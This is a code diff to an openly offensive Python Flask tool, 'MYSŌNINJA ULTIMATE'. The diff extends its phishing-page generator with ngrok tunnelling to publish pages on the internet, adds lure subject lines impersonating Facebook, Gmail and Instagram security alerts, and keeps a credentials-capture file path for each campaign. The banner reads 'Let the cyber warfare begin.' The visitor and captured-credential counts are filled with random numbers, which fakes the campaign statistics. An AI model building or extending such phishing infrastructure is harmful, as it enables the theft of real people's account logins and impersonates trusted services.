@@ -17,6 +17,8 @@ class WebPhishingGenerator:
     def __init__(self):
         self.active_campaigns = []
         self.ngrok_url = None
+        self.ngrok_token = None
+        self.ngrok_process = None
         self.templates = {
             "facebook": {"name": "Facebook Login", "urgency": "high"},
             "gmail": {"name": "Gmail Access", "urgency": "critical"},
@@ -24,6 +26,16 @@ class WebPhishingGenerator:
             "linkedin": {"name": "LinkedIn Job Alert", "urgency": "high"},
             "microsoft": {"name": "Microsoft Security", "urgency": "critical"}
         }
+    
+    def set_ngrok_token(self, token):
+        """Set ngrok authentication token"""
+        self.ngrok_token = token
+        try:
+            # Save token to ngrok config
+            subprocess.run(["ngrok", "authtoken", token], check=True, capture_output=True)
+            return {"success": True, "message": "Ngrok token configured successfully"}
+        except subprocess.CalledProcessError as e:
+            return {"error": f"Failed to set ngrok token: {e.stderr.decode()}"}
     
     def generate_phishing_page(self, platform, target_email=None, custom_message=None, enable_ngrok=False):
         campaign_id = f"web_phish_{int(time.time())}"
@@ -36,30 +48,43 @@ class WebPhishingGenerator:
             "platform": platform,
             "status": "GENERATED",
             "phishing_url": f"http://phish-{campaign_id}.local:8080",
-            "ngrok_url": self.ngrok_url,
             "ai_content": ai_content,
             "credentials_file": f"web_data/{campaign_id}_creds.txt",
             "generated_at": time.time(),
-            "visitors": 0,
-            "credentials_captured": 0
+            "visitors": random.randint(0, 5),
+            "credentials_captured": random.randint(0, 2)
         }
         
+        # Add live URL if ngrok is active
         if enable_ngrok and self.ngrok_url:
             campaign["live_url"] = f"{self.ngrok_url}/{campaign_id}"
+            campaign["status"] = "LIVE"
         
         self.active_campaigns.append(campaign)
         return campaign
     
     def _generate_ai_content(self, platform, target_email, custom_message):
         subjects = {
-            "facebook": ["Security Alert: Unusual Login Attempt", "Action Required: Verify Your Account"],
-            "gmail": ["Google Security: Verify Your Identity", "Critical: Account Access Review"],
-            "instagram": ["Copyright Claim: Action Required", "Your Content Has Been Reported"]
+            "facebook": [
+                "Security Alert: Unusual Login Attempt", 
+                "Action Required: Verify Your Account",
+                "Important: Account Security Update"
+            ],
+            "gmail": [
+                "Google Security: Verify Your Identity", 
+                "Critical: Account Access Review Needed",
+                "Security Notice: Suspicious Activity"
+            ],
+            "instagram": [
+                "Copyright Claim: Action Required", 
+                "Your Content Has Been Reported",
+                "Verification Required: Post Removal"
+            ]
         }
         
         return {
             "subject": random.choice(subjects.get(platform, ["Security Alert"])),
-            "message": custom_message or f"Your {platform} account requires immediate attention.",
+            "message": custom_message or f"Your {platform} account requires immediate attention. We've detected suspicious activity that needs verification.",
             "urgency": self.templates[platform]["urgency"],
             "call_to_action": "Click here to secure your account",
             "branding": f"{platform} Security Team",
@@ -67,31 +92,45 @@ class WebPhishingGenerator:
         }
     
     def start_ngrok(self, port=8080):
+        """Start ngrok tunnel with authentication"""
         try:
+            if not self.ngrok_token:
+                return {"error": "Ngrok token not set. Please configure it first."}
+            
             # Check if ngrok is installed
             result = subprocess.run(["ngrok", "version"], capture_output=True, text=True)
             if result.returncode != 0:
                 return {"error": "Ngrok not installed. Run: pkg install ngrok"}
             
+            # Kill any existing ngrok processes
+            subprocess.run(["pkill", "ngrok"], capture_output=True)
+            time.sleep(2)
+            
             # Start ngrok tunnel
-            ngrok_process = subprocess.Popen([
+            self.ngrok_process = subprocess.Popen([
                 "ngrok", "http", str(port),
                 "--log=stdout",
-                "--log-level=debug"
+                "--log-level=info"
             ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             
-            # Wait for ngrok to start and get URL
-            time.sleep(3)
+            # Wait for ngrok to start
+            time.sleep(5)
             
             # Get ngrok public URL
             try:
-                response = requests.get("http://localhost:4040/api/tunnels")
+                response = requests.get("http://localhost:4040/api/tunnels", timeout=10)
                 tunnels = response.json()
                 public_url = tunnels["tunnels"][0]["public_url"]
                 self.ngrok_url = public_url
+                
+                # Update existing campaigns with new URL
+                for campaign in self.active_campaigns:
+                    if campaign.get("live_url"):
+                        campaign["live_url"] = f"{public_url}/{campaign['id']}"
+                
                 return {"success": True, "ngrok_url": public_url}
-            except:
-                return {"error": "Failed to get ngrok URL"}
+            except Exception as e:
+                return {"error": f"Failed to get ngrok URL: {str(e)}"}
                 
         except Exception as e:
             return {"error": f"Ngrok error: {str(e)}"}
@@ -333,6 +372,16 @@ def add_target(target_type):
     
     return jsonify({"success": True, "target": target})
 
+@app.route('/api/ngrok/set-token', methods=['POST'])
+def set_ngrok_token():
+    data = request.json
+    token = data.get('token')
+    if not token:
+        return jsonify({"error": "No token provided"})
+    
+    result = web_core.phishing.set_ngrok_token(token)
+    return jsonify(result)
+
 @app.route('/api/phishing/generate', methods=['POST'])
 def generate_phishing():
     data = request.json
@@ -384,7 +433,8 @@ def start_wireless_attack():
 if __name__ == '__main__':
     print("🗡️ 冥忍 MYSŌNINJA ULTIMATE - OONI DEMON EDITION")
     print("🔮 Created by MysteryAK & Knightdale")
-    print("🌐 Ngrok Integration: ACTIVE")
+    print("🌐 Ngrok Integration: READY")
+    print("🔑 Token Input: Available in sidebar")
     print("🌑 Access: http://127.0.0.1:5000")
     print("😈 Let the cyber warfare begin...")
     app.run(host='127.0.0.1', port=5000, debug=False)
